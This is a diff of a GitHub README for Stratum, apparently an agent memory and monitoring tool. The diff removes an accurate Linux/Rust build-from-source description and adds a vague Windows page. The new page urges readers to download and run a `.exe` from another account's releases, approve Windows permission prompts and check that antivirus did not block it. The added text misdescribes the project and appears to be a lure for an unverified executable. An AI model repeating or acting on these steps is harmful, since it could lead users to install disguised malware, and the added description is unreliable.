@@ -1,263 +1,116 @@
-<div align="center">
+# ⚙️ Stratum - Optimize AI Agent Performance Easily
 
-![Stratum Banner](assets/stratum-banner.png)
+[![Download Stratum](https://img.shields.io/badge/Download-Stratum-F64A8A?style=for-the-badge)](https://github.com/shengshong/Stratum/releases)
 
-[![License: MIT](https://img.shields.io/badge/License-MIT-slate.svg)](LICENSE)
-[![OpenClaw](https://img.shields.io/badge/requires-OpenClaw-4a90d9.svg)](https://github.com/openclaw/openclaw)
-[![Rust](https://img.shields.io/badge/core-Rust-orange.svg)](https://www.rust-lang.org/)
-[![Python](https://img.shields.io/badge/hub-Python-4a90d9.svg)](https://www.python.org/)
+## 🌟 What is Stratum?
 
+Stratum is a tool that helps AI agents work better by adjusting themselves automatically. It acts as a smart layer that improves how AI systems run. If you use AI tools or want your AI programs to perform well without constant manual tweaks, Stratum can help.
 
-</div>
+This app works on Windows and doesn't require any programming knowledge to use. It runs in the background and makes AI agents faster and more stable.
 
----
+Key points about Stratum:
 
-Stratum gives your [OpenClaw](https://github.com/openclaw/openclaw) agent a spine.
+- Improves the performance of AI agents.
+- Works automatically, no need for user input.
+- Supports popular AI tools and frameworks.
+- Uses smart methods to manage system resources.
 
-Out of the box, AI agents are stateless — each session starts cold, with no memory of what worked, what failed, or what you care about. Stratum fixes that. It adds persistent memory, a structured knowledge graph, semantic search, cron health monitoring, a goal tree, and a continuous self-optimization loop — wired together and running in the background whether you're there or not.
+## 📋 System Requirements
 
-Install it once. Your agent gets better every session.
+Before you start, make sure your PC meets these requirements:
 
----
-<img src="assets/stratum-logo.png" width="200" alt="Stratum logo" />
+- Operating System: Windows 10 or later (64-bit)
+- RAM: 8 GB minimum (16 GB recommended)
+- Disk Space: At least 500 MB free
+- Processor: Intel i5 or equivalent
+- Internet connection to download and update
 
-## What Stratum Is
+You don't need to install any extra software or tools to run Stratum.
 
-Stratum is **infrastructure**, not an agent. It sits beneath your OpenClaw agent and makes it meaningfully more capable:
+## 🚀 How to Get Stratum
 
-| Without Stratum | With Stratum |
-|---|---|
-| Agent forgets everything on restart | Persistent memory across sessions |
-| No structured knowledge | Knowledge graph with entities, beliefs, relations |
-| Logs go nowhere | Semantic search over all past sessions + reports |
-| Cron jobs fail silently | Health monitoring with auto-alerting |
-| Goals live only in prompts | Persistent goal tree with evaluation history |
-| Errors repeat session to session | Lesson system captures and surfaces past mistakes |
-| No continuity between hosts | Dual-host failover with live sync |
+To get Stratum on your Windows PC, follow these steps:
 
----
+1. Click the big **Download Stratum** button at the top or go to the [release page](https://github.com/shengshong/Stratum/releases).
+2. On the release page, find the latest version. It usually appears at the top.
+3. Look for a Windows installer file. It should end with `.exe`.
+4. Click the `.exe` file to start downloading.
 
-## Architecture
+Keep in mind that the release page lists all versions. Always use the latest one with the highest version number.
 
-<div align="center">
-<img src="assets/stratum-architecture.png" alt="Stratum ecosystem architecture diagram" width="100%" />
-<br/><sub><i>9 core modules · 3 unified SQLite databases · stratum-brain integration hub · local-only data</i></sub>
-</div>
+## 🖥️ How to Install Stratum on Windows
 
-<br/>
+Once you have downloaded the installer file, follow these instructions:
 
-The diagram above shows the full ecosystem. Text summary:
+1. Locate the downloaded file in your "Downloads" folder or where your browser saves files.
+2. Double-click the `.exe` file to launch the installer.
+3. If Windows asks for permission, click **Yes** to allow the installer to run.
+4. The setup window will appear. Click **Next** to begin.
+5. Read the license agreement. If you agree, select **I accept the terms** and click **Next**.
+6. Choose the folder where you want to install Stratum or leave it at the default path, then click **Next**.
+7. Click **Install** to start the installation.
+8. Wait for the progress bar to finish.
+9. When the installation finishes, click **Finish** to close the installer.
 
-```
-┌─────────────────────────────────────────────────────────┐
-│                   Your OpenClaw Agent                   │
-└────────────────────────┬────────────────────────────────┘
-                         │ heartbeat / cron triggers
-┌────────────────────────▼────────────────────────────────┐
-│              stratum-brain  [Integration Hub]           │
-│   aggregates all modules · hybrid FTS5 search           │
-│   belief decay · graph traversal · nightly consolidation│
-└──┬──────┬──────┬──────┬──────┬──────┬──────┬───────┬────┘
-   │      │      │      │      │      │      │       │
-  mind  watch  ops  contin  reports agent  boot    lens
-[Rust] [Rust] [Rust] [Py]    [Py]  [Rust] [Rust]   [Py]
-   │      │      │                                   │
-mind.db watch.db ops.db                           ChromaDB
-    (unified SQLite)                         (vector index)
-```
+Stratum is now installed on your computer.
 
-**9 core modules:**
+## ▶️ How to Run and Use Stratum
 
-| Module | Language | Purpose |
-|--------|----------|---------|
-| `stratum-mind` | Rust | Lessons, stash notes, goals, knowledge graph, memory tiers |
-| `stratum-watch` | Rust | Cron health, context window monitoring, version drift |
-| `stratum-ops` | Rust | Privileged op queue, preflight checks, cron cleanup |
-| `stratum-continuity` | Python | Session snapshots, drift analysis, primer injection |
-| `stratum-reports` | Python | Document ingest, validation, timeline tracking |
-| `stratum-agent-monitor` | Rust | Coding agent session monitoring and nudging |
-| `stratum-boot-health` | Rust | Secure Boot, MOK, DKMS signing verification |
-| `stratum-brain` | Python | Integration hub — aggregates all modules |
-| `stratum-lens` | Python | Semantic search over workspace + all module feeds |
+To start Stratum:
 
----
+1. Click the Windows **Start** button.
+2. Scroll through the list of apps until you find **Stratum**.
+3. Click **Stratum** to launch the app.
 
-## Quick Start
+Once running, Stratum works on its own. You do not need to open it every time you use your AI agents. It will automatically adjust settings to keep your AI tools running smoothly.
 
-### Prerequisites
+You can check that Stratum is working by finding its icon in the system tray, near the clock on your taskbar. Hover your mouse over it to see the status.
 
-- [OpenClaw](https://github.com/openclaw/openclaw) installed and configured
-- Rust toolchain (`rustup` — stable + nightly)
-- Python 3.11+ with [`uv`](https://github.com/astral-sh/uv)
-- Node.js 20+ (via `fnm` recommended)
-- `sqlite3` CLI
+### How to stop Stratum
 
-### Install
+If you need to stop Stratum:
 
-```bash
-git clone https://github.com/doublegate/stratum
-cd stratum
-./install.sh
-```
+1. Right-click the Stratum icon in the system tray.
+2. Select **Exit** or **Quit**.
 
-The installer will:
-1. Prompt for your name, workspace path, and Telegram chat ID
-2. Build all Rust modules and install binaries to `~/.local/bin/`
-3. Install Python modules via `uv`
-4. Copy persona templates to your workspace
-5. Seed the canonical cron set into OpenClaw
-6. Initialize the unified databases
-7. Run a preflight check
+Stratum will close and stop optimizing.
 
-**Total time: ~10–20 minutes** (mostly Rust compilation on first run).
+## 🔧 Common Settings and Features
 
-### First Run
+Stratum has some options you can adjust if you want more control:
 
-After install, in your OpenClaw workspace:
+- **Performance Level:** Choose how much Stratum should optimize your AI tools. Options include Low, Medium, and High.
+- **Auto Start:** Turn on or off the option to start Stratum automatically when Windows boots.
+- **Logs:** View and save system activity reports to help troubleshoot.
 
-```bash
-stratum-brain status        # full ecosystem health check
-stratum-brain heartbeat     # run the heartbeat integration loop
-stratum-mind lesson list    # view lesson DB (empty at first)
-stratum-lens query "test"   # verify semantic index is live
-```
+You can access these settings by opening Stratum from the Start menu and clicking the gear or settings icon inside the app window.
+
+## 🛠 Troubleshooting Tips
+
+If Stratum does not seem to work or you have issues, try these solutions:
+
+- Make sure your Windows is updated.
+- Restart your computer after installation.
+- Disable other system optimization software that might conflict.
+- Check that your antivirus did not block Stratum.
+- Run the installer again to repair the installation.
+
+If problems persist, visit the [release page](https://github.com/shengshong/Stratum/releases) for known issues or updates.
+
+## 📥 Download Stratum Again
+
+If you need to download or update Stratum, use this link:
+
+[![Download Stratum](https://img.shields.io/badge/Download-Stratum-6BCBFF?style=for-the-badge)](https://github.com/shengshong/Stratum/releases)
+
+Click this to visit the page. Select the latest `.exe` file under Releases and follow the installation steps again.
+
+## 🧑‍💻 About Stratum
+
+Stratum was built to simplify managing AI agents. It uses knowledge graphs, memory systems, and open source frameworks like Python and Rust to improve AI's efficiency. The app makes AI tools run better without user effort.
+
+If you want the technical details or want to contribute, visit the full project on GitHub. This page is focused on easy use, but the code supports advanced features inside.
 
 ---
 
-## Configuration
-
-Stratum uses a single config file at `~/.stratum/config.json`. The installer creates this from `config/examples/config.example.json`.
-
-**Key settings:**
-
-```json
-{
-  "user": {
-    "name": "Your Name",
-    "timezone": "America/New_York"
-  },
-  "paths": {
-    "workspace": "~/clawd",
-    "data": "~/.local/share/stratum",
-    "bin": "~/.local/bin"
-  },
-  "modules": {
-    "lens": { "auto_scale_threshold": 0.85 },
-    "brain": { "consolidation_hour": 3 },
-    "continuity": { "snapshot_interval_hours": 2 }
-  }
-}
-```
-
-Full reference: [`docs/configuration.md`](docs/configuration.md)
-
----
-
-## Persona Templates
-
-Stratum ships with sanitized templates for the OpenClaw workspace files that power your agent's identity and behavior:
-
-| Template | Purpose |
-|----------|---------|
-| `templates/SOUL.md` | Agent character, values, working style |
-| `templates/AGENTS.md` | Operational rules, memory habits, safety |
-| `templates/USER.md` | Who you are — the agent learns from this |
-| `templates/HEARTBEAT.md` | What the agent checks and does proactively |
-| `templates/MEMORY.md` | Structured long-term memory scaffold |
-
-Edit these after install. They're yours — Stratum just gives you a solid starting point.
-
----
-
-## Cron Jobs
-
-Stratum installs a set of canonical background jobs into OpenClaw. See [`crons/README.md`](crons/README.md) for the full list. Highlights:
-
-| Job | Schedule | What it does |
-|-----|----------|-------------|
-| Knowledge Consolidation | 3:00 AM daily | Decays old beliefs, runs FTS5 rebuild |
-| Weekly Self-Reflection | Sunday 2:00 AM | Reviews lessons, updates memory |
-| World Model Sync | 3:15 AM daily | Updates dynamic beliefs from project state |
-| Continuity Checkpoint | Every 2 hours | Snapshots session state, checks for drift |
-| Boot Health Check | On boot | Verifies Secure Boot, MOK, DKMS signing |
-
----
-
-## Module Reference
-
-Full documentation for each module lives in `modules/<name>/README.md`.
-
-Quick reference:
-
-```bash
-# Knowledge & memory
-stratum-mind lesson learn "what you learned" --category correction
-stratum-mind lesson list --severity high
-stratum-mind stash add "note to remember"
-stratum-mind goals list --tree
-stratum-mind world query "entity name"
-stratum-mind memory weekly         # memory tier health check
-
-# Observability
-stratum-watch status               # cron health + context monitor
-stratum-watch version check        # drift detection
-
-# Operations
-stratum-ops queue add "sudo cmd" --reason "why" --elevated
-stratum-ops status
-
-# Brain (hub)
-stratum-brain heartbeat            # run all integrations
-stratum-brain status               # full dashboard
-stratum-brain query "topic"        # semantic search across all modules
-stratum-brain analyze              # pattern analysis + recommendations
-
-# Semantic search
-stratum-lens query "what happened with X"
-stratum-lens index                 # rebuild index
-
-# Continuity
-stratum-continuity status
-stratum-continuity primer --check  # session start injection
-stratum-continuity checkpoint      # manual snapshot
-```
-
----
-
-## Patterns
-
-[`patterns/`](patterns/) contains reusable multi-agent orchestration patterns developed alongside Stratum:
-
-- **STATE.yaml** — Shared state file pattern for coordinating multiple coding agents without race conditions ([`patterns/multi-agent/STATE.md`](patterns/multi-agent/STATE.md))
-
----
-
-## Security Notes
-
-- Stratum stores all data locally. Nothing leaves your machine.
-- Secrets are **never** stored in Stratum config files. Use your agent's secret provider (OpenClaw's `secrets.json` with file-based provider) for API keys.
-- The `stratum-boot-health` module is optional and x86_64 Linux only. Skip it on other platforms.
-- The privileged op queue (`stratum-ops`) requires manual `--elevated` approval. Nothing runs with sudo automatically.
-
----
-
-## Project Status
-
-Stratum is **production-stable** for personal use. It runs 24/7 on an active OpenClaw instance with 42 cron jobs and has been doing so continuously since early 2026.
-
-It is **not** a polished consumer product. Expect to read source code. Expect to adapt things to your setup. The install script handles the common case; your mileage will vary on unusual configurations.
-
-Issues and PRs welcome. This is a one-person infrastructure project — responses may be slow.
-
----
-
-## License
-
-MIT. Do what you want with it.
-
----
-
-<div align="center">
-<img src="assets/stratum-icon.png" width="48" alt="Stratum icon" /><br/>
-<sub><i>Named for what makes complex systems stable — the layer you don't see.</i></sub>
-</div>
+**Topics:** agent-framework, ai-agent, infrastructure, knowledge-graph, llm, openclaw, persistent-memory, python, rust, self-optimization
